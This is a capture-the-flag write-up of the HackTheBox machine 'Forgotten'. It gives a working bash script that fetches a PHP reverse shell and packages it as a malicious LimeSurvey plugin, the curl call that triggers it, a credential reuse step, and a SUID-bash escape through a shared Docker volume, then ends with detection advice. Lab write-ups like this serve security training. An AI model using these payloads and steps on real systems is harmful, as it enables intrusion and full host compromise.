---
icon: book-bookmark
---

# HTB-FORGOTTEN (VL)

<figure><img src="../../../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

### Summary

Forgotten starts with an uninitialized LimeSurvey instance. The attack path involves running through the installation wizard, pointing it to a self-hosted MySQL instance, and assigning superadmin rights. With admin access, we upload a malicious plugin to achieve RCE and gain shell access inside the LimeSurvey container. From there, we discover a password in environment variables that works for the limesvc account on the host, and escalate to root inside the container. Finally, we abuse the shared folder between container and host to place a root-owned SetUID binary for full system compromise.

***

### Reconnaissance & Initial Enumeration

#### Nmap Scan Results

Comprehensive port scan reveals minimal attack surface:

```bash
nmap -sC -sV -oA forgotten 10.129.212.70
```

**Open Ports & Services**:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.56
|_http-title: 403 Forbidden
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.56 (Debian)
```

**Key Observations**:

* SSH service running on port 22
* Apache web server on port 80 with 403 Forbidden response
* Server header indicates Debian-based system

***

### Web Enumeration & Directory Discovery

#### Initial Web Access

**Direct Access Attempt**:

```bash
curl http://10.129.212.70
```

**Result**: 403 Forbidden - No permission to access this resource.

#### Directory Enumeration

**Feroxbuster Directory Scanning**:

```bash
feroxbuster -u http://10.129.212.70/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Key Discovery**: `/survey/` directory found and accessible.

#### LimeSurvey Discovery

**Access Survey Directory**:

```bash
curl http://10.129.212.70/survey/
```

**Result**: Redirects to `http://10.129.212.70/survey/index.php?r=installer/welcome`

**Critical Finding**: Unfinished LimeSurvey installation detected.

**LimeSurvey Installation Interface**:

* Installation wizard available
* Requires database configuration
* Admin account creation possible

***

### LimeSurvey Installation & Configuration

#### MySQL Server Setup

**Create MySQL Docker Container**:

```bash
docker run --name limesurvey-mysql \
  -e MYSQL_ROOT_PASSWORD=rootpass123 \
  -e MYSQL_DATABASE=limesurvey2 \
  -e MYSQL_USER=limeuser \
  -e MYSQL_PASSWORD=limepassword \
  -p 3306:3306 \
  -d mysql:latest
```

**Verify MySQL Server**:

```bash
netstat -tnlp | grep 3306
```

**Result**: MySQL server running on port 3306.

#### LimeSurvey Installation Process

**Step 1: Database Configuration**

* Database Type: MySQL
* Database Location: \[Attacker IP]:3306
* Database Name: limesurvey2
* Database Username: limeuser
* Database Password: limepassword

**Step 2: Database Creation**

* Click "Create Database"
* Click "Populate Database"
* Database successfully initialized

**Step 3: Admin Account Setup**

* Set Admin Username: admin
* Set Admin Password: \[custom\_password]
* Administrative account created

**Step 4: Access Administration Panel**

* Click "Administration" button
* Login with admin credentials
* Successful authentication to LimeSurvey admin panel

***

### Malicious Plugin Development

#### Reverse Shell Plugin Creation

**Create rev.sh Script**:

```bash
#!/bin/bash
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <lhost> <lport>"
    exit 1
fi

L_HOST=$1
L_PORT=$2

download_reverse_shell() {
    local revshell_url="https://www.revshells.com/PHP%20PentestMonkey?ip=$L_HOST&port=$L_PORT&shell=sh&encoding=sh"
    curl -s "$revshell_url" -o rev.php
    [ -f rev.php ] || exit 1
}

update_rev_php() {
    sed -i "s/\$ip\s*=\s*'.*';/\$ip = '$L_HOST';/" rev.php
    sed -i "s/\$port\s*=\s*.*;/\$port = $L_PORT;/" rev.php
}

create_config_xml() {
    cat <<EOF > config.xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>RCE-Yoink</name>
        <type>plugin</type>
        <creationDate>2020-03-20</creationDate>
        <lastUpdate>2020-03-31</lastUpdate>
        <author>CatnetBuddies</author>
        <authorUrl>https://github.com/botnetbuddies</authorUrl>
        <supportUrl>https://github.com/botnetbuddies</supportUrl>
        <version>5.0</version>
        <license>GNU GPL v2+</license>
        <description><![CDATA[Author: Skid]]></description>
    </metadata>
    <compatibility>
        <version>3.0</version>
        <version>4.0</version>
        <version>5.0</version>
        <version>6.0</version>
    </compatibility>
    <updaters disabled="disabled"></updaters>
</config>
EOF
}

create_zip_file() {
    zip -r RCE-Yoink.zip config.xml rev.php >/dev/null 2>&1
    echo "[+] Zip Created"
    [ -f RCE-Yoink.zip ] || exit 1
}

download_reverse_shell
update_rev_php
create_config_xml
create_zip_file
```

#### Plugin Generation

**Execute Plugin Creation**:

```bash
bash rev.sh 10.10.16.xxx 4444
```

**Output**: `RCE-Yoink.zip` created successfully.

**Plugin Components**:

* `config.xml` - Plugin metadata for LimeSurvey validation
* `rev.php` - PHP reverse shell payload

***

### Plugin Upload & Exploitation

#### Plugin Installation Process

**Step 1: Access Plugin Configuration**

* Navigate to Configuration → Plugins in admin panel
* Upload `RCE-Yoink.zip` file

**Step 2: Install Plugin**

* Click "Install" after upload
* Navigate to Page 2 to find the plugin
* Click on three dots menu
* Select "Activate Plugin"

#### Reverse Shell Execution

**Setup Listener**:

```bash
pwncat-cs -p 4444
```

**Trigger Reverse Shell**:

```bash
curl -s http://10.129.212.70/survey/upload/plugins/RCE-Yoink/rev.php
```

**Result**: Connection received! Shell access obtained inside Docker container.

***

### Docker Container Analysis

#### Container Environment Discovery

**Check Hostname**:

```bash
hostname
```

**Result**: Container-specific hostname confirms Docker environment.

**Environment Variable Analysis**:

```bash
env
```

**Critical Discovery**: Password found in environment variables:

* **Password**: `5W5HN4K4GCXf9E`

#### Container Privilege Escalation

**Test Password for Root Access**:

```bash
sudo su
```

**Password**: `5W5HN4K4GCXf9E`

**Result**: Successfully escalated to root within Docker container.

***

### Host System Access

#### User Enumeration

**Check Available Users**:

```bash
ls /home
```

**Result**: User `limesvc` identified.

#### SSH Access to Host

**SSH Connection**:

```bash
ssh limesvc@10.129.212.70
```

**Password**: `5W5HN4K4GCXf9E`

**Result**: Successfully authenticated to host system as limesvc user.

#### User Flag Retrieval

**Obtain User Flag**:

```bash
cat /home/limesvc/user.txt
```

**Result**: User flag obtained successfully.

***

### Privilege Escalation Analysis

#### Shared Directory Discovery

**Inside Docker Container**:

```bash
sudo su
cd /var/www/html/survey
echo "hello host!" > test
```

**On Host System**:

```bash
cat limesurvey/test
```

**Result**: File content visible, confirming shared directory between container and host.

**Shared Directory Mapping**:

* Container: `/var/www/html/survey`
* Host: `/home/limesvc/limesurvey`

***

### SUID Binary Privilege Escalation

#### Creating Malicious SUID Binary

**Inside Docker Container (as root)**:

```bash
sudo su
cd /var/www/html/survey
cp /bin/bash /var/www/html/survey/rootshell
chmod 6777 /var/www/html/survey/rootshell
ls -l /var/www/html/survey/rootshell
```

**Expected Output**:

```
-rwsrwsrwx 1 root root 1396520 [date] rootshell
```

**SUID Bit Explanation**:

* `6777` permissions set SUID (4) and SGID (2) bits plus full permissions (777)
* SUID allows execution with owner privileges (root)
* File created inside container but accessible from host via shared directory

#### Root Access Exploitation

**On Host System**:

```bash
ls limesurvey/rootshell
```

**Result**: SUID binary visible in shared directory.

**Execute SUID Binary**:

```bash
limesurvey/rootshell -p
```

**Flag**: `-p` preserves elevated privileges

**Result**: Root shell obtained on host system!

#### Root Flag Retrieval

**Obtain Root Flag**:

```bash
cat /root/root.txt
```

**Result**: Root flag captured successfully.

***

### Complete Attack Chain Summary

```
1. Port Scanning → SSH + HTTP services discovered
2. Web Enumeration → /survey/ directory found
3. LimeSurvey Discovery → Uninitialized installation detected
4. MySQL Setup → Docker container with database created
5. Installation Process → Admin account configured
6. Malicious Plugin → PHP reverse shell in plugin format
7. Plugin Upload → RCE-Yoink.zip installed and activated
8. Reverse Shell → Container access obtained
9. Environment Analysis → Password discovered in env variables
10. Container Escalation → Root access within Docker
11. Host Authentication → SSH access as limesvc user
12. Shared Directory → Container-host file sharing identified
13. SUID Binary Creation → Root-owned bash binary with SUID bit
14. Privilege Escalation → Root access via SUID binary exploitation
15. Full Compromise → Root flag obtained
```

***

### Technical Deep Dive

#### LimeSurvey Plugin Architecture

**Plugin Structure Requirements**:

* `config.xml` - Metadata and compatibility information
* PHP files - Functional code (in this case, reverse shell)
* ZIP format - Standard plugin packaging

**config.xml Components**:

```xml
<metadata>
    <name>RCE-Yoink</name>
    <type>plugin</type>
    <version>5.0</version>
    <author>CatnetBuddies</author>
</metadata>
<compatibility>
    <version>3.0</version>
    <version>4.0</version>
    <version>5.0</version>
    <version>6.0</version>
</compatibility>
```

#### Docker Container Security Model

**Container Isolation Limitations**:

* Shared directories bypass container isolation
* File permissions preserved across container boundary
* SUID binaries maintain elevated privileges on host

**Volume Mounting Implications**:

* Container path: `/var/www/html/survey`
* Host path: `/home/limesvc/limesurvey`
* Bidirectional file access between environments

#### SUID Binary Exploitation

**Permission Setting Process**:

```bash
chmod 6777 rootshell
```

**Permission Breakdown**:

* `6` - Special permissions (SUID=4 + SGID=2)
* `777` - Full read/write/execute for all users

**Execution Method**:

```bash
./rootshell -p
```

* `-p` flag preserves privileges during execution
* Maintains root effective UID despite being executed by regular user

***

### Key Vulnerabilities Exploited

#### 1. Application Security Issues

* **Uninitialized Installation** - LimeSurvey setup accessible
* **Plugin Upload** - Arbitrary file upload via plugin mechanism
* **Code Execution** - PHP reverse shell execution
* **Administrative Access** - Unrestricted admin panel access

#### 2. Container Security Misconfigurations

* **Environment Variable Exposure** - Sensitive credentials in env
* **Shared Directory Access** - Bidirectional file system access
* **Privilege Escalation** - Root access within container
* **SUID Binary Creation** - Elevated privilege binary placement

#### 3. Host System Vulnerabilities

* **Credential Reuse** - Same password for container and host
* **SSH Access** - Direct authentication to host system
* **Directory Permissions** - Writable shared directory
* **SUID Execution** - Binary execution with elevated privileges

#### 4. Docker Implementation Issues

* **Volume Mounting** - Excessive file system exposure
* **Permission Inheritance** - SUID bits preserved across boundaries
* **Root Container Access** - Unrestricted container root privileges
* **Host-Container Trust** - Implicit trust of container-created files

***

### Detection Strategies

#### Web Application Monitoring

* **Installation Attempts** - Monitor for setup wizard access
* **Plugin Uploads** - Track administrative file uploads
* **Unusual PHP Execution** - Detect reverse shell patterns
* **Database Connections** - Monitor external database access

#### Container Security Monitoring

* **Environment Variable Access** - Track env command execution
* **Privilege Escalation** - Monitor sudo usage within containers
* **File System Changes** - Detect binary creation in shared volumes
* **Network Connections** - Identify outbound connections from containers

#### Host System Monitoring

* **SSH Authentication** - Monitor authentication attempts
* **SUID Binary Execution** - Track execution of SUID binaries
* **Privilege Escalation** - Detect root access attempts
* **File System Permissions** - Monitor permission changes on shared directories

#### Network Security Monitoring

* **Reverse Shell Traffic** - Identify outbound TCP connections
* **Database Traffic** - Monitor MySQL connection attempts
* **HTTP POST Requests** - Track file upload activities
* **Administrative Access** - Monitor admin panel logins

***

<figure><img src="../../../../.gitbook/assets/complete (35).gif" alt=""><figcaption></figcaption></figure>
